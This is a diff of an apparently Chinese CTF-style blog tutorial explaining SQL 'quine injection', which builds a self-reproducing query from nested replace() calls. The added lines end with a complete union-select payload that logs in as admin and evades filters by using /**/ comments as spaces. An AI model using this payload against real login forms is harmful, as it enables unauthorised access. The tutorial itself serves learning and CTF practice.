@@ -184,14 +184,14 @@
             
             <span class="tag">
                 
-                <a href="/tags/Web/" style="color: #00bcd4">
+                <a href="/tags/Web/" style="color: #ffa2c4">
                     Web
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/SQL/" style="color: #ffa2c4">
+                <a href="/tags/SQL/" style="color: #03a9f4">
                     SQL
                 </a>
             </span>
@@ -256,21 +256,31 @@ if(isset($_GET[&#39;source&#39;]))&#123;
 <pre><code class="SQL">select replace(&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;,char(46),&#39;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#39;); #查询语句
 replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;); #输出语句
 </code></pre>
-<p>&emsp;&emsp;真神奇啊，查询语句和输出基本是完全一致的。但有问题，那就是引号仍然存在不同，原本的单引号成为了双引号(本来字符串中包含.的是双引号，所以会出现这样的情况)，然而我们不能把原来的单引号改成双引号来避免，<font color="#ff9f9f"><strong>因为replace(“.”,char(46),”.”)字符串中有双引号，所以把它当作字符串写入replace时要用单引号，不然会报错</strong></font>。<br>&emsp;&emsp;所以要想办法把’变成”，同时又要保持输入输出相等，那么再用一次replace不久好了?于是就构造出了以下的语句:</p>
+<p>&emsp;&emsp;真神奇啊，查询语句和输出基本是完全一致的。但有问题，那就是引号仍然存在不同，原本的单引号成为了双引号(本来字符串中包含.的是双引号，所以会出现这样的情况)，然而我们不能把原来的单引号改成双引号来避免，<br>&emsp;&emsp;<font color="#ff9f9f"><strong>因为replace(“.”,char(46),”.”)字符串中有双引号，所以把它当作字符串写入replace时要用单引号，不然会报错</strong></font>。<br>&emsp;&emsp;所以要想办法把’变成”，同时又要保持输入输出相等，那么再用一次replace不久好了?于是就构造出了以下的语句:</p>
 <pre><code class="SQL">replace(&quot;.&quot;,char(34),char(39)) #首先是最好想的，把&quot;变成&#39;，输出的是 .
 replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;) #实现自我替换，输出的仍然是 .
 replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)); #将之前的语句作为字符串，改变其中的引号，成功达成了将引号变换
 replace(replace(&#39;.&#39;,char(34),char(39)),char(46),&#39;.&#39;)
 </code></pre>
 <p>&emsp;&emsp;实现了引号的替换,就再套一次之前的quine语句就好哩</p>
-<pre><code class="SQL">replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);
+<pre><code class="SQL">select replace(replace(&#39;select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);
 </code></pre>
 <p>&emsp;&emsp;这就是sql quine的语句了,真的很神奇呢。</p>
-<h4 id="回到例题"><a href="#回到例题" class="headerlink" title="回到例题"></a>回到例题</h4><p>&emsp;&emsp;再看例题，利用我们得出的模板，将注入语句添加到几个位置即可</p>
-<pre><code class="SQL">/*这是第一个位置，因为查询语句不可能只是replace这样，需要select等。如联合注入时，就用类似于1&#39; union select */replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;);
+<h4 id="回到例题"><a href="#回到例题" class="headerlink" title="回到例题"></a>回到例题</h4><p>&emsp;&emsp;再看例题，利用我们得出的模板，改为注入的样式即可</p>
+<pre><code class="SQL">1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)# 
+/*这个是基本的语句，参考 replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)*/
+replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39))
+/*这样就解决了引号不一致的问题*/
+1&#39; union select replace(replace(&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot; union select replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
+/*这个语句的返回值就和它本身是一模一样的了，也就是所谓的输入输出一致*/
+/*这里还要注意以下基本语句的1&quot;的这个双引号，因为这里用单引号的话会有配对问题，所以设为双引号，利用之后的replace来使之变为单引号，不会引起匹配问题。*/
 </code></pre>
+<p>最终pl:</p>
+<pre><code class="SQL">username=admin&amp;password=1&#39;/**/union/**/select/**/replace(replace(&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;,char(34),char(39)),char(46),&#39;1&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#39;)#
+</code></pre>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>&emsp;&emsp;尽管quine注入的适用范围似乎并不太大，但确实很有意思，也可能可以用来解决一些密码比较问题，也比盲注方便不少。<br>&emsp;&emsp;多一门手艺总是好的&#x1F917;</p>
 <blockquote>
-<p>参考:<br>    - <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2287111">SQL注入之Quine注入</a><br>    - <a target="_blank" rel="noopener" href="https://j-0k3r.github.io/2023/12/06/Quine%E6%B3%A8%E5%85%A5/#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-yet-another-mysql-injection">Quine注入</a></p>
+<p>参考 &#x1F970;:<br>    - <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2287111">SQL注入之Quine注入</a><br>    - <a target="_blank" rel="noopener" href="https://j-0k3r.github.io/2023/12/06/Quine%E6%B3%A8%E5%85%A5/#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-2021-yet-another-mysql-injection">Quine注入</a></p>
 </blockquote>
 
     </div>
